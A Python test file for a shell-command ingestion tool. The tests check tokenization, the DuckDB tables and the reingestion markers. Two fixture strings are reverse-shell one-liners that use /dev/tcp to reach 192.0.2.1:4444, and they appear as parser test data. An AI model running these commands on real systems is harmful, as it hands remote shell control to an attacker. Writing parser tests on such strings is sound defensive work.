"""Verify shell fields and complete-run markers through the real database writer."""
import json

import duckdb
from test_ingest_batches import invoke


def test_shell_fields_roundtrip(tmp_path):
    """Parser upgrades must retain redirections, duplicates, and source positions."""
    inputs = ['cd ..; X=y ls "docs a" > /dev/null', 'echo same same | cat same',
              'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1', 'echo "|" $(id)',
              'cat <<EOF\nhello world\nEOF', 'echo a\\\nb']
    source = f'''
from _ingest import shell_commands, ShellInput
INPUTS = {inputs!r}
def records(root, options):
    for i, text in enumerate(INPUTS):
        commands = [Command(pgm, args, f'{{i}}:{{j}}')
                    for j, (pgm, args, other) in enumerate(shell_commands(text))]
        yield ShellInput(text, str(i), commands)
    yield Command('/bin/sh', ['-c', 'echo x > y'], 'native')
'''
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = {r[0]: r[1:] for r in con.execute('SELECT record_id,shell_input,pgms,tokens FROM SHELL_INPUTS').fetchall()}
        assert len(rows) == len(inputs)
        assert rows['0'][:2] == (inputs[0], ['cd', 'ls'])
        assert rows['0'][2] == ['cd', '..', ';', 'X=y', 'ls', '"docs a"', '>', '/dev/null']
        assert rows['1'][2] == ['echo', 'same', 'same', '|', 'cat', 'same']
        assert rows['2'][2] == ['bash', '-i', '>&', '/dev/tcp/192.0.2.1/4444', '0', '>&', '1']
        assert rows['3'][1] == ['echo', 'id']
        assert rows['4'][1] == ['cat']
        assert rows['4'][2] == ['cat', '<<', 'EOF', 'hello world\n', 'EOF']
        assert rows['5'][0] == inputs[5]
        parsed = dict(con.execute('SELECT record_id,struct_pack(pgm := pgm,args := args) FROM PROCESS_LAUNCHES').fetchall())
        assert parsed['0:1'] == {'pgm': 'ls', 'args': ['docs a']}
        assert parsed['3:0'] == {'pgm': 'echo', 'args': ['|', '$(id)']}
        assert parsed['3:1'] == {'pgm': 'id', 'args': []}
        assert parsed['4:0'] == {'pgm': 'cat', 'args': []}
        assert parsed['5:0'] == {'pgm': 'echo', 'args': ['ab']}
        assert con.execute("SELECT pgm,args,record_id FROM PROCESS_LAUNCHES WHERE record_id='native'").fetchall() == [('/bin/sh', ['-c', 'echo x > y'], 'native')]
        assert [row[0] for row in con.execute('DESCRIBE PROCESS_LAUNCHES').fetchall()] == [
            'pgm', 'pgm_base', 'args', 'dataset', 'record_id', 'dataset_label', 'group_id', 'session_id', 'os',
            'ai_label', 'override_label', 'label']
        for table in ('PROCESS_LAUNCHES', 'SHELL_INPUTS'):
            assert con.execute(
                f'SELECT DISTINCT ai_label,override_label,label FROM {table}').fetchall() == [
                    (None, None, 'unknown')]
    again = invoke(tmp_path, database, source)
    assert json.loads(again.stdout)['skipped']


def test_sample_is_retryable(tmp_path):
    """A bounded inspection must not prevent a later complete release import."""
    source = "def records(root, options):\n    yield Command('id', [], '1')\n    yield Command('ls', [], '2')\n"
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source, '--limit', '1')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (False,)
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT count(*) FROM PROCESS_LAUNCHES').fetchone() == (2,)
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (True,)


def test_old_complete_database_requires_reingestion(tmp_path):
    """Old completion markers must not silently bypass the changed table format."""
    database = tmp_path / 'old.duckdb'
    with duckdb.connect(str(database)) as con:
        con.execute('CREATE TABLE PROCESS_LAUNCHES(pgm VARCHAR)')
        con.execute("INSERT INTO PROCESS_LAUNCHES VALUES ('saved')")
        con.execute('CREATE TABLE INGESTED(dataset VARCHAR, ingested BOOLEAN)')
        con.execute('INSERT INTO INGESTED VALUES (?, true)', [tmp_path.name])
    result = invoke(tmp_path, database, "def records(root, options):\n    return []\n")
    assert result.returncode != 0
    assert 'Use --db with a new database' in result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT * FROM PROCESS_LAUNCHES').fetchall() == [('saved',)]


def test_redirection_descriptor_is_not_an_execution(tmp_path):
    """Detect tree-sitter-bash treating a descriptor-only redirect as a program."""
    source = """
from _ingest import shell_commands, ShellInput
def records(root, options):
    text = '0<&3; exec 3<>/dev/tcp/192.0.2.1/4444; bash <&3 >&3 2>&3; foo 0<&3; 0<&3 /bin/bash -i'
    commands = [Command(pgm, args, str(i)) for i, (pgm, args, other) in enumerate(shell_commands(text))]
    yield ShellInput(text, 'input', commands)
"""
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT pgm,args FROM PROCESS_LAUNCHES ORDER BY record_id').fetchall() == [('bash', []), ('foo', []), ('/bin/bash', ['-i'])]
        assert con.execute('SELECT pgms FROM SHELL_INPUTS').fetchall() == [(['bash', 'foo', 'bash'],)], 'Descriptor-only exec changes the shell; it does not launch a program'
